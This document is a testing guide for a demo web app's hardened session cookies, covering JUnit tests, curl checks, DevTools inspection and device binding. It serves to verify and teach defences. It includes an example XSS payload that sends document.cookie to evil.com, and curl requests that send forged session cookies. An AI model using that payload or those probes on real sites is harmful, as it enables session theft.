# How to test the session + cookie security

Four claims are being made by the new code. Each one is tested at a different
level, because no single tool can check all four:

| # | The claim | Tested by |
|---|---|---|
| 1 | The cookie carries an **opaque id**, not your name, email or counter | JUnit + curl + DevTools |
| 2 | The `HttpOnly`, `Secure`, `SameSite` attributes are **actually set** | JUnit + curl |
| 3 | The browser **honours** those attributes | Only the browser can show this |
| 4 | The session can be **revoked on the server** | JUnit + curl |

Claim 3 is the one people skip, and it is the one a reviewer will ask about.
`MockMvc` can prove we *wrote* `HttpOnly` onto the header; only a real browser
can prove it *hides the cookie from JavaScript*. Both halves are below.

---

## Layer 1 — The automated suite (start here)

```bash
cd backend
.\mvnw.cmd test
```

> On Mac/Linux: `./mvnw test`

Expected:

```
Tests run: 42, Failures: 0, Errors: 0, Skipped: 0
```

They live in two files:
[`SessionSecurityTest.java`](backend/src/test/java/com/example/cookiedemo/SessionSecurityTest.java)
(17 tests, the session cookie) and
[`DeviceBindingTest.java`](backend/src/test/java/com/example/cookiedemo/DeviceBindingTest.java)
(25 tests, the device binding).

These are **integration tests**, not unit tests: a real Spring context starts, the
real controller runs, and a real (in-memory) database is written to. Only the
network is faked, which is why the suite finishes in seconds and needs no TLS
certificate, no free port, and no browser.

That choice matters more for device binding than for anything else here. The
interesting bugs in a feature like this are not in the branch logic — they are in
the wiring: checking the device *before* the password, setting the cookie on the
wrong outcome, letting a rejected login still count a visit or revoke the
session that was already on the machine. A unit test of `DeviceBindingService`
would sail past every one of those, so every test drives the real endpoint.

One thing to know before reading `SessionSecurityTest`: its fixture account is an
**ADMIN**. Several of its tests sign in twice from what MockMvc presents as a
fresh browser each time, which is exactly the pattern device binding refuses.
Admins are exempt, so the fixture keeps those tests measuring sessions and only
sessions. The worker path is covered next door.

### What each test pins down

| Test | The thing that would otherwise silently rot |
|---|---|
| `cookieIsHardened` | Someone deletes `.httpOnly(true)` and nobody notices for six months |
| `cookieCarriesNoPersonalData` | Someone "helpfully" puts the username back in the cookie to save a query |
| `idsAreUnpredictable` | Someone swaps `SecureRandom` for `Random`, or for a counter |
| `databaseStoresOnlyTheHash` | Someone stores the raw token because hashing "seemed like overkill" |
| `meResolvesTheSession` | The happy path still works after all of the above |
| `noCookieMeansAnonymous` | A missing cookie must not crash or fall through to a default user |
| `forgedIdIsRejected` | Made-up ids get nothing |
| `handWrittenPayloadIsRejected` | The **old** attack — pasting `tejas\|Someone Else\|...\|999` — now fails |
| `wrongPasswordIssuesNothing` | A failed login must not leave a usable session behind |
| `signingInRotatesTheSession` | Session fixation: a fresh id every time privilege changes |
| `logoutRevokesServerSide` | Logout deletes the row, not just the browser's copy |
| `logoutToleratesAStaleCookie` | A cookie pointing at a deleted row must not blow up |
| `expiredSessionIsRejected` | Expiry is enforced by us, never by the browser's goodwill |
| `visitCountStaysOnTheServer` | Someone "helpfully" adds `visits` back to the API response |
| `returningVisitsAreCounted` | A refresh counts as a visit, without a password |
| `anonymousVisitsAreNotCounted` | A dead or missing cookie must count nothing |
| `countSurvivesLogout` | The counter is on the account, not the session |

And in `DeviceBindingTest.java`, one per row of the decision table plus the
things around it:

| Test | The thing that would otherwise silently rot |
|---|---|
| `bindsTheBrowser` | The first login mints a UUID and sends it |
| `storesOnlyTheHash` | Someone stores the raw device token because "it is not a password" |
| `deviceCookieIsHardened` | The *long-lived* cookie is the one that must not lose `HttpOnly` |
| `allowsTheBoundBrowser` | The happy path — the normal, boring, daily case |
| `refreshesRatherThanRotates` | Someone copies the session's rotate-on-login logic onto the wrong cookie |
| `deviceIsNotACredential` | The right browser still needs the right password |
| `rejectsAnotherWorkerOnABoundWorkstation` | The rule the whole feature exists for |
| `rejectsABoundWorkerOnAFreshBrowser` | A worker cannot move themselves to a new machine |
| `rejectsAForgedDeviceToken` | An invented UUID gets nobody in |
| `refusalHasNoSideEffects` | A refusal must not count a visit or hand out a cookie |
| `refusalLeavesTheExistingSessionAlone` | Someone reorders the checks and lets a failed login sign out the person already there |
| `adminGetsNoDeviceCookie` | Admins are not asked the question, not merely passed |
| `adminIgnoresSomeoneElsesBinding` | The admin must be able to work *at* the locked-out worker's desk |
| `registrationIgnoresAnyRoleInTheBody` | `/api/register` can never mint an admin |
| `guardsTheEndpoint` / `guardsTheListing` | A worker with a perfectly valid session is still not an admin |
| `resetAllowsReRegistration` | The escape hatch actually works |
| `staleCookieRebindsAfterAReset` | The subtle one — after a reset the old browser still holds the orphaned cookie, and must not be locked out by it |
| `resetSignsTheWorkerOut` | Otherwise the machine you just unbound stays signed in |
| `listingShowsBindingsButNoSecrets` | Someone adds the token hash to the admin screen "for debugging" |

### The test database

`src/test/resources/application.properties` overrides the real settings so tests
use `jdbc:h2:mem:testdb` and never touch `backend/data/cookiedemo`. Running the
suite cannot damage your demo accounts.

Note that `app.session.cookie-secure` stays **true** there. Whether `Secure` gets
written onto the header is exactly what is being asserted, so it has to be on.

---

## Layer 2 — The command line

This is the fastest way to *see* the header with your own eyes, and it is what
you would show someone who does not want to read Java.

**Start the backend first** (`cd backend` then `.\mvnw.cmd spring-boot:run`).

> ### Three gotchas — read these or you will chase a phantom bug
>
> Every command in this section is written for **PowerShell**.
>
> 1. Write **`curl.exe`**, not `curl`. In Windows PowerShell, `curl` is an alias
>    for `Invoke-WebRequest`, which takes completely different arguments.
> 2. `-k` tells curl "do not verify the certificate". Our development
>    certificate is self-signed, so this is expected. Never carry that flag into
>    anything real — it switches off the check that HTTPS exists to perform.
> 3. **JSON quoting differs between shells, and the two forms are not
>    interchangeable.** PowerShell 5.1 mangles `-d "{\"a\":\"b\"}"` on its way to
>    a native executable, so the server receives broken JSON and answers
>    `400 Bad Request` — which looks exactly like a login failure and is not one.
>
> ```
> PowerShell:  -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
> bash/zsh:    -d '{"username":"demo","password":"pw123"}'
> ```
>
> If you prefer something that works identically in both, put the body in a file
> and pass `-d "@login.json"`.

### 2a. TLS is on, and plain HTTP is refused

```bash
curl.exe -s http://localhost:8443/api/me
```

```
Bad Request
This combination of host and port requires TLS.
```

The server will not speak plain HTTP at all. That is the "apply HTTPS" part,
demonstrated in one line.

### 2b. Look at the Set-Cookie header

```bash
curl.exe -k -s -D - -o NUL -X POST https://localhost:8443/api/login -H "Content-Type: application/json" -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
```

(Register `demo` first if you have not:)

```bash
curl.exe -k -s -X POST https://localhost:8443/api/register -H "Content-Type: application/json" -d '{\"username\":\"demo\",\"password\":\"pw123\",\"fullName\":\"Demo User\",\"email\":\"demo@example.com\"}'
```

The line to point at:

```
Set-Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos; Path=/; Max-Age=2592000; Expires=Fri, 04 Sep 2026 11:39:09 GMT; Secure; HttpOnly; SameSite=Lax
```

Read it left to right:

- `sid=ULaB692K…` — 43 characters of Base64url. **No name. No email. No counter.**
  Compare with the old header, which read
  `userInfo=tejas%7CTejas+Jaiswal%7Ctejas%40example.com%7C3`.
- `Secure` — the browser will not send this back over plain `http://`.
- `HttpOnly` — `document.cookie` will not list it.
- `SameSite=Lax` — another site cannot make your browser send it along.
- `Path=/` and **no `Domain`** — this host only, no subdomains.

### 2c. Watch curl itself respect HttpOnly

Save the cookie to a jar and look inside:

```bash
curl.exe -k -s -c jar.txt -o NUL -X POST https://localhost:8443/api/login -H "Content-Type: application/json" -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
type jar.txt
```

```
#HttpOnly_localhost	FALSE	/	TRUE	1788521949	sid	ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

Two flags are visible in that line: the `#HttpOnly_` prefix on the host, and the
`TRUE` in the fourth column, which is curl's "secure" column. A client that is
not a browser is tracking the same two attributes.

### 2d. The id resolves to a profile — from the database

```bash
curl.exe -k -s -b jar.txt https://localhost:8443/api/me
```

```json
{"fullName":"Demo User","found":true,"email":"demo@example.com","username":"demo"}
```

Nothing in that answer travelled in the cookie. The browser sent 43 random
characters; every field came out of a row.

### 2e. Try to break it

```bash
# no cookie at all
curl.exe -k -s https://localhost:8443/api/me

# an invented session id
curl.exe -k -s -H "Cookie: sid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://localhost:8443/api/me

# the OLD hand-edited cookie — the attack that used to work
curl.exe -k -s -H "Cookie: sid=demo|Someone Else|evil@example.com|999" https://localhost:8443/api/me
```

All three:

```json
{"found":false}
```

That third one is the money shot for a demo. Under the old design, that exact
string made the app greet you as "Someone Else" with 999 sign-ins. Now it is a
string that hashes to a row that does not exist.

### 2f. Session rotation (the fixation defence)

Sign in twice, carrying the cookie, and compare the ids:

```bash
curl.exe -k -s -b jar.txt -c jar.txt -o NUL -X POST https://localhost:8443/api/login -H "Content-Type: application/json" -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
type jar.txt
```

The id changes on every sign-in, and the previous one stops working immediately.
Observed:

```
old id : ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
new id : T0CYa_rA1SUts0d-onZB0m3A4t2H04Bk-YjrOj-6WeU
replaying the old id  -> {"found":false}
using the new id      -> {"found":true, "fullName":"Demo User", ...}
```

The account's `VISITS` count is unaffected by the swap — it lives on `APP_USER`,
precisely so that rotating (or revoking) a session cannot reset it.

### 2g. Revocation is real

```bash
curl.exe -k -s -D - -b jar.txt -X POST https://localhost:8443/api/logout
```

```
Set-Cookie: sid=; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Secure; HttpOnly; SameSite=Lax
{"message":"Session ended and cookie erased."}
```

Now replay the cookie value you had before — the copy an attacker would have
kept:

```bash
curl.exe -k -s -H "Cookie: sid=T0CYa_rA1SUts0d-onZB0m3A4t2H04Bk-YjrOj-6WeU" https://localhost:8443/api/me
```

```json
{"found":false}
```

**This is the single biggest improvement, and it is worth saying out loud.**
Before, "logging out" was a polite request to the browser: a cookie someone had
already copied kept working for the remaining 30 days, and there was nothing the
server could do about it. Now the truth lives in a row, and deleting the row
kills every copy of that cookie everywhere, instantly.

---

## Layer 3 — The browser (the half MockMvc cannot do)

Start both halves:

```bash
cd backend
.\mvnw.cmd spring-boot:run
```

```bash
cd frontend
npm start
```

Open **https://localhost:3000** — note the **s**. Both servers use self-signed
certificates, so the browser will warn once. Click *Advanced → Proceed*. That
warning is the certificate check working correctly; it is telling you it cannot
verify who `localhost` is, which is true.

### 3a. HttpOnly, proved live

Sign in, then open DevTools (`F12`) → **Console**, and type:

```js
document.cookie
```

```
''
```

Empty. The session cookie exists — the browser is sending it on every
request — but JavaScript is not allowed to see it.

**Why this is the important one:** imagine a bug somewhere in the app lets an
attacker inject `<script>fetch('https://evil.com?c=' + document.cookie)</script>`.
Before, that one line stole the cookie and, with it, the session. Now it steals
an empty string.

Note that other cookies may well be listed — anything else on `localhost` from
another project, or a browser extension. That is fine, and it makes the point
better than an empty string would: `sid` is conspicuously *not* among them, even
though it is being sent on every request.

### 3b. See the attributes in DevTools

`F12` → **Application** → **Cookies** → `https://localhost:3000`

| Name | Value | Path | Expires | HttpOnly | Secure | SameSite |
|---|---|---|---|---|---|---|
| `sid` | `ULaB692K73XL…` | `/` | in 30 days | ✔ | ✔ | `Lax` |

Two things to point at:

1. The **Value** column is gibberish. Nothing personal is stored in this browser.
2. The **HttpOnly** and **Secure** ticks are the browser confirming it will
   enforce them — not us claiming we asked for them.

### 3c. Secure, proved live

In the Application tab, try to read the cookie over plain HTTP. The simplest
version of this: temporarily set `app.session.cookie-secure=false` in
`application.properties`, restart, sign in again, and watch the **Secure** tick
disappear. Set it back to `true` afterwards.

The realistic version, if you want to be thorough: run the frontend without
`HTTPS=true` in `.env`, and note the cookie is still stored — because Chrome and
Firefox make a deliberate exception for `localhost`, treating it as a trusted
origin. On any other hostname, an `http://` page cannot store a `Secure` cookie
at all. This is a good thing to know before someone points it out.

### 3d. Staying signed in, and signing out for real

1. **Sign in.**
2. **Press F5.** You stay on the account screen. No password, no flicker back to
   the login form — the browser sent the cookie, the server found the session
   row, React went straight to the account panel.
3. **Open a new tab** at `https://localhost:3000`. Signed in there too.
4. **Close the browser completely**, reopen. Still signed in. It survived because
   the cookie has an expiry date and so was written to disk, rather than being a
   memory-only "session cookie". This keeps working for 30 days.
5. **Sign out**, then refresh. You stay out — the session row is gone, so there
   is nothing for `/api/me` to find. Your account is untouched in `APP_USER`.

Step 5 is the difference from before: signing out is no longer a polite request
to the browser, it is a `DELETE` on the server. Nothing the browser kept can
bring that session back.

**Watch the counter while you do this.** In the H2 console (Layer 4 below):

```sql
SELECT USERNAME, VISITS FROM APP_USER;
```

It climbs on the sign-in *and* on every refresh in steps 2–4, because each of
those resolved a live session without a password being typed. It is never sent to
the browser — not on screen, not in the JSON — so the database is the only place
you can see it.

---

## Layer 4 — The database

Open **https://localhost:8443/h2-console** (https now, and note the port).

- JDBC URL: `jdbc:h2:file:./data/cookiedemo`
- User: `sa`
- Password: *(blank)*

```sql
SELECT * FROM USER_SESSION;
```

```
ID          3bb5a229766c16c4662014fedcc78f4a2bbaf54cc03b3186052b948871ca53fa
USERNAME    demo
FULL_NAME   Demo User
EMAIL       demo@example.com
VISITS      1
CREATED_AT  2026-08-05 17:09:54.857+05:30
EXPIRES_AT  2026-09-04 17:09:54.857+05:30
```

Now do the comparison that makes the point. The cookie in the browser was:

```
dAgS4kVhnTMq2nLNb2DXiyJP-eqMo2EYKlYIE78ydfY
```

and the `ID` column is `3bb5a229…53fa`. Those are not the same string, and they
are not supposed to be — `ID` is the SHA-256 of the cookie. Confirm it yourself:

```powershell
$token = "dAgS4kVhnTMq2nLNb2DXiyJP-eqMo2EYKlYIE78ydfY"
$sha = [System.Security.Cryptography.SHA256]::Create()
-join ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($token)) | ForEach-Object { $_.ToString("x2") })
```

```
3bb5a229766c16c4662014fedcc78f4a2bbaf54cc03b3186052b948871ca53fa
```

Match.

**Why go to this trouble?** Because the session id is a live credential — whoever
holds it *is* the user, no password required. If the table stored it raw, then a
leaked backup, a debug log, or someone glancing at this very console would hand
over working sessions. Storing the hash means the table can only *recognise* a
session id, never *produce* one. It is the same reasoning as hashing passwords,
applied one layer up.

(Plain SHA-256 is the right choice here, and BCrypt would be the wrong one: the
token is already 256 bits of true randomness, so there is nothing to brute-force,
and a deliberately slow hash would be paid for on every single request.)

While you are here, run this too:

```sql
SELECT * FROM APP_USER;
```

The two tables together are the whole architecture: `APP_USER` is who exists,
`USER_SESSION` is who is currently signed in and on which browser.

---

## Layer 5 — Attacks that should now fail

Worth walking through if someone asks "so what does this actually stop?".

| Attack | Before | Now | What stops it |
|---|---|---|---|
| Edit the cookie to become another user | Worked | Fails | The cookie has no identity in it to edit |
| Set your own sign-in count to 9999 | Worked | Fails | The counter is a column, not a cookie field |
| XSS reads `document.cookie` and posts it away | Worked | Gets `''` | `HttpOnly` |
| Sniff the cookie on shared wifi | Worked | Nothing to sniff | HTTPS + `Secure` |
| `evil.com` silently POSTs to `/api/logout` | Worked | Cookie not attached | `SameSite=Lax` |
| Reuse a cookie copied before logout | Worked for 30 days | Dead immediately | Server-side revocation |
| Plant a session id, wait for the victim to log in | Worked | Planted id is discarded | Rotation on login |
| Read the session table and sign in as someone | Worked | Cannot | Only the hash is stored |
| Guess a session id | n/a | 2^256 possibilities | `SecureRandom`, 32 bytes |

---

## Layer 6 — Device binding, by hand

The automated suite proves the rules. This proves them in a way a manager can
watch. Ten minutes, two browsers.

You need **two different browsers** — Chrome and Firefox, or one normal window
and one private window. Two *tabs* are not two workstations: they share a cookie
jar, which is the whole point.

### 6a. First-time registration

1. In **Browser A**, create a worker account and sign in.
2. **DevTools → Application → Cookies**. You should see **two** cookies now:

   | Name | Value | Expires |
   |---|---|---|
   | `sid` | 43 random characters | ~30 days |
   | `did` | a UUID, `8-4-4-4-12` hex | years away |

   Both must show ✓ under `HttpOnly` and ✓ under `Secure`.

3. Confirm the `did` value is nowhere in the database:

   ```sql
   SELECT USERNAME, DEVICE_TOKEN_HASH FROM APP_USER;
   ```

   You get a 64-character hex string that is *not* the UUID in the browser — same
   trick as the session cookie, for the same reason. Paste the UUID into a
   SHA-256 calculator and you get the stored value back.

### 6b. The same worker, a different browser

In **Browser B**, sign in as that same worker with the correct password.

```
403  Your account is already registered to a different workstation.
     Ask an administrator to reset your device registration.
```

Right password, right username, refused anyway. That is the feature.

### 6c. A different worker, the same browser

Back in **Browser A**, sign out, then sign in as a *second* worker.

```
403  This workstation is already registered to another user.
```

Note what the message does **not** say: whose desk it is. A login form that names
the person who normally sits there is a directory of who sits where.

### 6d. The admin walks up

Still in **Browser A** — the desk bound to worker one — sign in as the admin.

It works. Admins are exempt, and this case *has* to work, because the person who
fixes a locked-out worker is standing at that worker's machine.

Check DevTools again: the `did` cookie is untouched, still holding worker one's
token. The admin was never issued one.

### 6e. The reset

As the admin, open **Workstations** on the account screen. You should see every
worker and a green **Bound** tag against the one who registered. Click **Reset**.

Now:

- The reset worker's `did` on Browser A still exists — the browser was never told
  anything. It is simply orphaned.
- Their session is gone. If they had a tab open, their next page load drops them
  to the sign-in screen.
- Signing in from **Browser B** now succeeds and registers *that* browser.
- Signing in again from **Browser A** is now refused — the orphaned cookie proves
  nothing.

That last pair is the sequence worth showing: the binding genuinely moved.

### 6f. The thing that surprises people

On Browser B, sign in as the worker, then **sign out**. Look at the cookies.

`sid` is gone. `did` is still there.

That is deliberate and it is the most common thing to get wrong. Signing out ends
a *session*; it does not un-register a *workstation*. If logout cleared `did`,
every worker would be unbound the moment they went home, and the entire office
would need an admin reset every Monday morning.

---

### What is still NOT protected

Say these before someone else does — knowing the gaps is more convincing than
pretending there are none.

1. **Passwords are still stored as plain text.** This is now the weakest thing in
   the project by a distance. The fix is `BCryptPasswordEncoder` from
   `spring-boot-starter-security` — hash on register, `matches()` on login.
2. **No rate limiting on `/api/login`.** Nothing stops ten thousand password
   guesses a second.
3. **No CSRF token.** `SameSite=Lax` covers the realistic cases here, but a
   defence-in-depth setup pairs it with a synchroniser token.
4. **The password check is not constant-time.** `String.equals` short-circuits;
   a real one compares hashes with `MessageDigest.isEqual`.
5. **The dev certificate is self-signed**, so it proves the traffic is encrypted
   but proves nothing about who is at the other end. Production means a real CA
   certificate, or TLS terminated at a proxy in front of this app.
6. **The H2 console is enabled.** Fine on a laptop, a wide-open door on a server.
   Set `H2_CONSOLE_ENABLED=false` before anything is deployed (`render.yaml`
   already does).
7. **Device binding is a cookie, and behaves like one.** A worker who clears
   their cookies is locked out until an admin resets them, and a worker who
   deliberately copies their cookie store to another machine has moved their
   registration. It is a control against casual account sharing in a trusted
   office — say that plainly rather than letting someone assume it is hardware
   attestation.
8. **The bootstrap admin defaults to `admin`/`admin`.** The app logs a loud
   warning when it starts that way. Set `APP_BOOTSTRAP_ADMIN_USERNAME` and
   `APP_BOOTSTRAP_ADMIN_PASSWORD`.

---

## Troubleshooting

**`Could not open the keystore` / the backend will not start**
The certificate has not been generated yet. From `backend/`:

```bash
make-keystore.cmd
```

If `keytool is not recognized`, point at your JDK first:
`set JAVA_HOME=C:\Program Files\Java\jdk-26.0.2`

**`ERR_SSL_PROTOCOL_ERROR` in the browser**
You opened `http://localhost:8443`. It is `https://` now.

**The React app shows a blank page / `Proxy error: self signed certificate`**
`frontend/src/setupProxy.js` is missing or `http-proxy-middleware` is not
installed. Run `npm install` in `frontend/`.

**The cookie does not appear in DevTools**
Check you are on `https://localhost:3000`, not `http://`. A `Secure` cookie is
only stored on an origin the browser trusts.

**Everyone is suddenly signed out after a code change**
Expected. Restarting does not clear sessions (they are rows in a file database),
but deleting `backend/data/` does.

**`.\mvnw.cmd test` fails to download anything**
First run needs internet to fetch Maven and the dependencies.
